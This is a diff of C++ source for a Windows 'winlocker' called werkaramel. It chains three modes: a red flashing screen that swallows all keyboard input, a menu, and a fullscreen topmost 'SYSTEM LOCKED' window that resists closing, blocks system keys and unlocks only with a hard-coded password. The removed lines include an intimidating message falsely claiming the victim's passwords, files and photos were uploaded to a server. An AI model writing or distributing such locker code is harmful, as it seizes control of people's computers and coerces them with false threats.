@@ -1,7 +1,6 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — red flash + cmd typing + green menu + locker
+// werkaramel — 3 modes: red flash / green menu / winlocker
 #include <windows.h>
-#include <windowsx.h>
 #include <string>
 #include <thread>
 #include <chrono>
@@ -9,109 +8,30 @@
 
 const std::wstring PASS = L"123";
 
-int g_phase = 0;
-int g_menu_choice = 0;
-std::wstring g_typed;
-size_t g_type_pos = 0;
-std::wstring g_input;
-bool g_wrong = false;
-bool g_unlocked = false;
 HHOOK g_kbHook = nullptr;
 HANDLE g_hOut = INVALID_HANDLE_VALUE;
+HANDLE g_hIn = INVALID_HANDLE_VALUE;
 HWND g_hCon = nullptr;
-HWND g_hFlash = nullptr;
+std::wstring g_input;
+bool g_done = false;
 std::mt19937 g_rng(std::random_device{}());
 
-int RandInt(int lo, int hi) {
-    std::uniform_int_distribution<int> d(lo, hi);
-    return d(g_rng);
-}
-
-const std::wstring SCENE_TEXT =
-    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
-    L"\n"
-    L"вы скачали winlocker werkaramel. это не игрушка.\n"
-    L"уже поздно. всё что нужно — сделано.\n"
-    L"\n"
-    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
-    L"всё это уже на нашем сервере.\n"
-    L"\n"
-    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
-    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
-    L"\n"
-    L"попытка закрыть это окно = немедленная блокировка.\n"
-    L"попытка перезагрузить = потеря данных навсегда.\n"
-    L"\n"
-    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";
-
-LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
-    if (code == HC_ACTION && !g_unlocked) {
-        auto* kb = (KBDLLHOOKSTRUCT*)lp;
-        DWORD vk = kb->vkCode;
-        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
-        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-        if (vk == VK_F11) return 1;
-        if (vk == VK_ESCAPE) return 1;
-        if (g_phase == 0 || g_phase == 1 || g_phase == 2) return 1;
-    }
-    return CallNextHookEx(g_kbHook, code, wp, lp);
-}
-
-LRESULT CALLBACK FlashProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    switch (msg) {
-    case WM_PAINT: {
-        PAINTSTRUCT ps;
-        HDC dc = BeginPaint(hwnd, &ps);
-        RECT rc; GetClientRect(hwnd, &rc);
-
-        HBRUSH bg = CreateSolidBrush(RGB(140, 10, 10));
-        FillRect(dc, &rc, bg);
-        DeleteObject(bg);
-
-        HFONT font = CreateFontW(120, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
-                                 DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
-                                 CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
-                                 DEFAULT_PITCH, L"Arial");
-        HFONT old = (HFONT)SelectObject(dc, font);
-        SetTextColor(dc, RGB(255, 255, 255));
-        SetBkMode(dc, TRANSPARENT);
-
-        std::wstring s = L"ВАС ЗАМЕТИЛИ";
-        SIZE sz;
-        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
-        TextOutW(dc, (rc.right - sz.cx) / 2, (rc.bottom - sz.cy) / 2,
-                 s.c_str(), (int)s.size());
-
-        SelectObject(dc, old);
-        DeleteObject(font);
-
-        EndPaint(hwnd, &ps);
-        return 0;
-    }
-    case WM_CLOSE: return 0;
-    case WM_SYSCOMMAND:
-        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
-        return 0;
-    case WM_DESTROY:
-        return 0;
-    }
-    return DefWindowProcW(hwnd, msg, wp, lp);
-}
-
+// ═══════════════════════════════════════════════════════════
+// КОНСОЛЬНЫЕ УТИЛИТЫ
+// ═══════════════════════════════════════════════════════════
 void WOut(const std::wstring& s) {
     DWORD w = 0;
     WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
 }
 void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
-void ClearScreen() {
+void ClearScreen(WORD bg = 0) {
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     DWORD cells, w;
     COORD home = {0, 0};
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
     cells = csbi.dwSize.X * csbi.dwSize.Y;
     FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
-    FillConsoleOutputAttribute(g_hOut, 0, cells, home, &w);
+    FillConsoleOutputAttribute(g_hOut, bg, cells, home, &w);
     SetConsoleCursorPosition(g_hOut, home);
 }
 void Gotoxy(int x, int y) {
@@ -120,15 +40,13 @@ void Gotoxy(int x, int y) {
 }
 
 BOOL WINAPI CtrlHandler(DWORD type) {
-    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT ||
-        type == CTRL_LOGOFF_EVENT || type == CTRL_SHUTDOWN_EVENT) return TRUE;
+    if (type == CTRL_C_EVENT) return TRUE;
     return FALSE;
 }
 
 void LockConsole() {
     LONG style = GetWindowLong(g_hCon, GWL_STYLE);
-    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
-               WS_MAXIMIZEBOX | WS_SYSMENU);
+    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
     SetWindowLong(g_hCon, GWL_STYLE, style);
     HMENU menu = GetSystemMenu(g_hCon, FALSE);
     if (menu) {
@@ -138,52 +56,106 @@ void LockConsole() {
     }
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
-    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
-                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
+    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_FRAMECHANGED | SWP_SHOWWINDOW);
     SetConsoleCtrlHandler(CtrlHandler, TRUE);
+
+    CONSOLE_FONT_INFOEX cfi{};
+    cfi.cbSize = sizeof(cfi);
+    cfi.dwFontSize.Y = 20;
+    cfi.dwFontSize.X = 10;
+    wcscpy_s(cfi.FaceName, L"Consolas");
+    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 }
 
-void PrintTyped() {
-    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-    Gotoxy(2, 2);
-    int col = 2, row = 2;
-    for (size_t i = 0; i < g_typed.size(); ++i) {
-        wchar_t c = g_typed[i];
-        if (c == L'\n') {
-            col = 2; row++; Gotoxy(col, row);
-        } else {
-            WOut(std::wstring(1, c)); col++;
-        }
+void LaunchSelf(const std::wstring& arg) {
+    wchar_t exePath[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
+    std::wstring cmd = L"\"" + std::wstring(exePath) + L"\" " + arg;
+    STARTUPINFOW si{};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi{};
+    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
+                       nullptr, nullptr, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
 }
 
-void PrintGlitch() {
-    const wchar_t* noise = L"!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`01";
-    int nlen = (int)wcslen(noise);
+// блокировка системных клавиш
+LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
+    if (code == HC_ACTION) {
+        auto* kb = (KBDLLHOOKSTRUCT*)lp;
+        DWORD vk = kb->vkCode;
+        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
+        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if (vk == VK_ESCAPE) return 1;
+        if (vk == VK_F11) return 1;
+    }
+    return CallNextHookEx(nullptr, code, wp, lp);
+}
+
+// полная блокировка (для красной фазы)
+LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
+    if (code == HC_ACTION) return 1;
+    return CallNextHookEx(nullptr, code, wp, lp);
+}
+
+// ═══════════════════════════════════════════════════════════
+// РЕЖИМ 1: КРАСНЫЙ CMD (--red)
+// ═══════════════════════════════════════════════════════════
+void RunRed() {
+    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    g_hCon = GetConsoleWindow();
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleCP(CP_UTF8);
+    LockConsole();
+    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
+    SetForegroundWindow(g_hCon);
+
+    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
+                                 GetModuleHandleW(nullptr), 0);
+
+    // мерцание 2 сек
+    for (int i = 0; i < 12; ++i) {
+        ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
+        std::this_thread::sleep_for(std::chrono::milliseconds(80));
+        ClearScreen(0);
+        std::this_thread::sleep_for(std::chrono::milliseconds(80));
+    }
+
+    // ВАС ЗАМЕТИЛИ 1 сек
+    ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
     int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
-    ClearScreen();
-    for (int i = 0; i < 120; ++i) {
-        Gotoxy(RandInt(0, cols - 1), RandInt(0, rows - 1));
-        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-        WOut(std::wstring(1, noise[RandInt(0, nlen - 1)]));
-    }
+    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+    std::wstring txt = L"В А С   З А М Е Т И Л И";
+    Gotoxy((cols - (int)txt.size()) / 2, rows / 2);
+    WOut(txt);
+    std::this_thread::sleep_for(std::chrono::seconds(1));
+
+    // запускаем --green и выходим
+    LaunchSelf(L"--green");
+    UnhookWindowsHookEx(g_kbHook);
+    ExitProcess(0);
 }
 
+// ═══════════════════════════════════════════════════════════
+// РЕЖИМ 2: ЗЕЛЁНЫЙ CMD (--green)
+// ═══════════════════════════════════════════════════════════
 void PrintMenu() {
-    ClearScreen();
+    ClearScreen(0);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
     int cols = csbi.dwSize.X;
+    int rows = csbi.dwSize.Y;
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     std::wstring logo = L"W E R K A R A M E L";
     Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);
-
     std::wstring sub = L"W I N L O C K E R";
     Gotoxy((cols - (int)sub.size()) / 2, 5); WOut(sub);
-
     std::wstring line(60, L'=');
     Gotoxy((cols - 60) / 2, 7); WOut(line);
 
@@ -197,150 +169,158 @@ void PrintMenu() {
     Gotoxy(10, 13); WOut(L"[ 3 ]   Выйти");
 
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-    std::wstring hint = L"нажмите 1 / 2 / 3 и Enter";
-    Gotoxy((cols - (int)hint.size()) / 2, csbi.dwSize.Y - 3);
-    WOut(hint);
-}
-
-void PrintJoke() {
-    ClearScreen();
-    CONSOLE_SCREEN_BUFFER_INFO csbi;
-    GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    int cols = csbi.dwSize.X;
+    std::wstring hint = L"введите 1 / 2 / 3 и нажмите Enter";
+    Gotoxy((cols - (int)hint.size()) / 2, rows - 4); WOut(hint);
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    std::wstring a = L"BUY KEY...";
-    Gotoxy((cols - (int)a.size()) / 2, 8); WOut(a);
-
-    std::wstring b = L"лан шучу братан, халявно";
-    Gotoxy((cols - (int)b.size()) / 2, 10); WOut(b);
-
+    Gotoxy(2, rows - 2); WOut(L"> ");
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    std::wstring c = L"вот ключ:  123";
-    Gotoxy((cols - (int)c.size()) / 2, 13); WOut(c);
-
-    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    std::wstring d = L"удачи!";
-    Gotoxy((cols - (int)d.size()) / 2, 15); WOut(d);
-
-    std::wstring e = L"tg @werkaramel";
-    Gotoxy((cols - (int)e.size()) / 2, 17); WOut(e);
+    WOut(g_input + L"  ");
 }
 
-void PrintLocker() {
-    ClearScreen();
-    CONSOLE_SCREEN_BUFFER_INFO csbi;
-    GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    int cols = csbi.dwSize.X;
-
-    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-    std::wstring logo = L"W E R K A R A M E L";
-    Gotoxy((cols - (int)logo.size()) / 2, 2); WOut(logo);
-
-    std::wstring locked = L"S Y S T E M   L O C K E D";
-    Gotoxy((cols - (int)locked.size()) / 2, 5); WOut(locked);
-
-    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    std::wstring hint = L"введите пароль для разблокировки:";
-    Gotoxy((cols - (int)hint.size()) / 2, 8); WOut(hint);
-
-    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-    std::wstring tg = L"tg: @werkaramel";
-    Gotoxy((cols - (int)tg.size()) / 2, 10); WOut(tg);
-
-    std::wstring masked(g_input.size(), L'*');
-    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    Gotoxy((cols - 42) / 2, 13);
-    WOut(L"[ " + masked + std::wstring(40 - masked.size(), L' ') + L" ]");
-
-    if (g_wrong) {
-        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-        std::wstring err = L"неверный пароль";
-        Gotoxy((cols - (int)err.size()) / 2, 15); WOut(err);
-    }
-}
-
-DWORD WINAPI SceneThread(LPVOID) {
+void RunGreen() {
+    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
+    g_hCon = GetConsoleWindow();
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
     LockConsole();
+    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
+    SetForegroundWindow(g_hCon);
 
-    CONSOLE_FONT_INFOEX cfi{};
-    cfi.cbSize = sizeof(cfi);
-    cfi.dwFontSize.Y = 20;
-    cfi.dwFontSize.X = 10;
-    wcscpy_s(cfi.FaceName, L"Consolas");
-    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
+    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
+                                 GetModuleHandleW(nullptr), 0);
 
-    std::this_thread::sleep_for(std::chrono::seconds(2));
-    if (g_hFlash) {
-        ShowWindow(g_hFlash, SW_HIDE);
-        DestroyWindow(g_hFlash);
-        g_hFlash = nullptr;
-    }
-
-    g_phase = 1;
-    ClearScreen();
-    auto start = std::chrono::steady_clock::now();
-    while (g_type_pos < SCENE_TEXT.size()) {
-        g_typed += SCENE_TEXT[g_type_pos++];
-        PrintTyped();
-        std::this_thread::sleep_for(std::chrono::milliseconds(40));
-    }
-    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start).count();
-    if (elapsed < 2000)
-        std::this_thread::sleep_for(std::chrono::milliseconds(2000 - elapsed));
-
-    g_phase = 2;
-    for (int i = 0; i < 15; ++i) {
-        PrintGlitch();
-        std::this_thread::sleep_for(std::chrono::milliseconds(80));
-    }
-
-    g_phase = 3;
     PrintMenu();
-    return 0;
-}
 
-LRESULT CALLBACK MsgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    switch (msg) {
-    case WM_CHAR:
-        if (g_phase == 3) {
-            if (wp == L'1') g_menu_choice = 1;
-            else if (wp == L'2') g_menu_choice = 2;
-            else if (wp == L'3') g_menu_choice = 3;
-            else if (wp == VK_RETURN && g_menu_choice != 0) {
-                if (g_menu_choice == 2) {
-                    g_phase = 4;
-                    PrintJoke();
-                    std::this_thread::sleep_for(std::chrono::seconds(3));
-                }
-                g_phase = 5;
-                PrintLocker();
-                g_menu_choice = 0;
-            }
-        } else if (g_phase == 5) {
-            if (wp == VK_BACK) {
-                if (!g_input.empty()) g_input.pop_back();
-                g_wrong = false;
-                PrintLocker();
-            } else if (wp == VK_RETURN) {
-                if (g_input == PASS) {
-                    g_unlocked = true;
-                    UnhookWindowsHookEx(g_kbHook);
-                    PostQuitMessage(0);
-                } else {
-                    g_input.clear();
-                    g_wrong = true;
-                    PrintLocker();
-                }
-            } else if (wp >= 32) {
-                g_input.push_back((wchar_t)wp);
-                g_wrong = false;
-                PrintLocker();
+    INPUT_RECORD rec;
+    DWORD read = 0;
+
+    while (!g_done) {
+        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            continue;
+        }
+        if (rec.EventType != KEY_EVENT) continue;
+        if (!rec.Event.KeyEvent.bKeyDown) continue;
+
+        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
+        if (c == 0) continue;
+
+        if (c >= L'0' && c <= L'9') {
+            g_input += c;
+            PrintMenu();
+        } else if (c == L'\b') {
+            if (!g_input.empty()) g_input.pop_back();
+            PrintMenu();
+        } else if (c == L'\r') {
+            if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
+                g_done = true;
+                LaunchSelf(L"--locker");
+                UnhookWindowsHookEx(g_kbHook);
+                ExitProcess(0);
+            } else {
+                g_input.clear();
+                PrintMenu();
             }
         }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// РЕЖИМ 3: WINLOCKER (--locker)
+// ═══════════════════════════════════════════════════════════
+const COLORREF C_BG = RGB(0, 0, 0);
+const COLORREF C_RED = RGB(220, 30, 30);
+const COLORREF C_FG = RGB(255, 255, 255);
+const COLORREF C_DIM = RGB(120, 120, 120);
+std::wstring g_locker_input;
+bool g_locker_wrong = false;
+bool g_locker_done = false;
+
+void DrawL(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
+           int size, bool bold = false, bool center = false, int winW = 0) {
+    HFONT font = CreateFontW(size, 0, 0, 0, bold ? FW_BOLD : FW_NORMAL,
+                             FALSE, FALSE, FALSE, DEFAULT_CHARSET,
+                             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                             CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
+    HFONT old = (HFONT)SelectObject(dc, font);
+    SetTextColor(dc, c);
+    SetBkMode(dc, TRANSPARENT);
+    if (center) {
+        SIZE sz;
+        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
+        x = (winW - sz.cx) / 2;
+    }
+    TextOutW(dc, x, y, s.c_str(), (int)s.size());
+    SelectObject(dc, old);
+    DeleteObject(font);
+}
+
+void LockerPaint(HWND hwnd) {
+    PAINTSTRUCT ps;
+    HDC dc = BeginPaint(hwnd, &ps);
+    RECT rc; GetClientRect(hwnd, &rc);
+    HBRUSH bg = CreateSolidBrush(C_BG);
+    FillRect(dc, &rc, bg);
+    DeleteObject(bg);
+    int cx = rc.right / 2;
+    DrawL(dc, 0, 60, L"WERKARAMEL", C_RED, 60, true, true, rc.right);
+    for (int x = cx - 300; x < cx + 300; x += 14)
+        DrawL(dc, x, 150, L"▬", C_RED, 12);
+    DrawL(dc, 0, 200, L"SYSTEM LOCKED", C_RED, 110, true, true, rc.right);
+    DrawL(dc, 0, 340, L"введите пароль для разблокировки", C_DIM, 24, false, true, rc.right);
+    DrawL(dc, 0, 380, L"tg: @werkaramel", C_RED, 26, false, true, rc.right);
+    int boxW = 600, boxH = 80;
+    int boxX = cx - boxW / 2;
+    int boxY = rc.bottom / 2 + 60;
+    RECT box{ boxX, boxY, boxX + boxW, boxY + boxH };
+    HBRUSH bf = CreateSolidBrush(RGB(20, 20, 20));
+    FillRect(dc, &box, bf);
+    DeleteObject(bf);
+    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
+    std::wstring masked(g_locker_input.size(), L'*');
+    DrawL(dc, boxX + 30, boxY + 22, masked, C_FG, 40);
+    if (g_locker_wrong) {
+        DrawL(dc, 0, boxY + boxH + 30, L"НЕВЕРНЫЙ ПАРОЛЬ", C_RED, 28, true, true, rc.right);
+    } else {
+        DrawL(dc, 0, boxY + boxH + 30, L"[ Enter ]  разблокировать", C_DIM, 22, false, true, rc.right);
+    }
+    EndPaint(hwnd, &ps);
+}
+
+LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
+    switch (msg) {
+    case WM_PAINT: LockerPaint(hwnd); return 0;
+    case WM_KEYDOWN:
+        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
+        if (wp == VK_ESCAPE) return 0;
+        return 0;
+    case WM_SYSCOMMAND:
+        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
+        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
+        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
+        return 0;
+    case WM_CLOSE: return 0;
+    case WM_CHAR:
+        if (wp == VK_BACK) {
+            if (!g_locker_input.empty()) g_locker_input.pop_back();
+            g_locker_wrong = false;
+        } else if (wp == VK_RETURN) {
+            if (g_locker_input == PASS) {
+                g_locker_done = true;
+                UnhookWindowsHookEx(g_kbHook);
+                PostQuitMessage(0);
+            } else {
+                g_locker_input.clear();
+                g_locker_wrong = true;
+                MessageBeep(MB_ICONHAND);
+            }
+        } else if (wp >= 32) {
+            g_locker_input.push_back((wchar_t)wp);
+            g_locker_wrong = false;
+        }
+        InvalidateRect(hwnd, nullptr, FALSE);
         return 0;
     case WM_DESTROY:
         UnhookWindowsHookEx(g_kbHook);
@@ -350,52 +330,50 @@ LRESULT CALLBACK MsgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
-int wmain() {
-    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    g_hCon = GetConsoleWindow();
-    ShowWindow(g_hCon, SW_SHOW);
-    SetForegroundWindow(g_hCon);
-
-    WNDCLASSW fw{};
-    fw.lpfnWndProc = FlashProc;
-    fw.hInstance = GetModuleHandleW(nullptr);
-    fw.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
-    fw.lpszClassName = L"werka_flash";
-    RegisterClassW(&fw);
-
+void RunLocker() {
+    WNDCLASSW wc{};
+    wc.lpfnWndProc = LockerProc;
+    wc.hInstance = GetModuleHandleW(nullptr);
+    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
+    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
+    wc.lpszClassName = L"werka_locker";
+    RegisterClassW(&wc);
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
-
-    g_hFlash = CreateWindowExW(
-        WS_EX_TOPMOST, L"werka_flash", L"",
-        WS_POPUP, 0, 0, sw, sh,
-        nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);
-
-    ShowWindow(g_hFlash, SW_SHOWMAXIMIZED);
-    SetForegroundWindow(g_hFlash);
-    UpdateWindow(g_hFlash);
-
-    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook,
-                                  GetModuleHandleW(nullptr), 0);
-
-    CreateThread(nullptr, 0, SceneThread, nullptr, 0, nullptr);
-
-    WNDCLASSW mw{};
-    mw.lpfnWndProc = MsgProc;
-    mw.hInstance = GetModuleHandleW(nullptr);
-    mw.lpszClassName = L"werka_msg";
-    RegisterClassW(&mw);
-
-    HWND hm = CreateWindowExW(0, L"werka_msg", L"", 0, 0, 0, 0, 0,
-                              HWND_MESSAGE, nullptr,
-                              GetModuleHandleW(nullptr), nullptr);
-    SetFocus(hm);
-    SetForegroundWindow(hm);
-
+    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"werka_locker", L"System Locked",
+        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);
+    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
+    SetForegroundWindow(hwnd);
+    SetFocus(hwnd);
+    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
+                                 GetModuleHandleW(nullptr), 0);
     MSG m;
     while (GetMessageW(&m, nullptr, 0, 0)) {
         TranslateMessage(&m);
         DispatchMessageW(&m);
     }
+}
+
+// ═══════════════════════════════════════════════════════════
+// ТОЧКА ВХОДА
+// ═══════════════════════════════════════════════════════════
+int wmain(int argc, wchar_t** argv) {
+    for (int i = 1; i < argc; ++i) {
+        if (wcscmp(argv[i], L"--red") == 0) {
+            RunRed();
+            return 0;
+        }
+        if (wcscmp(argv[i], L"--green") == 0) {
+            RunGreen();
+            return 0;
+        }
+        if (wcscmp(argv[i], L"--locker") == 0) {
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+            RunLocker();
+            return 0;
+        }
+    }
+    // без флага — стартуем с --red
+    LaunchSelf(L"--red");
     return 0;
 }
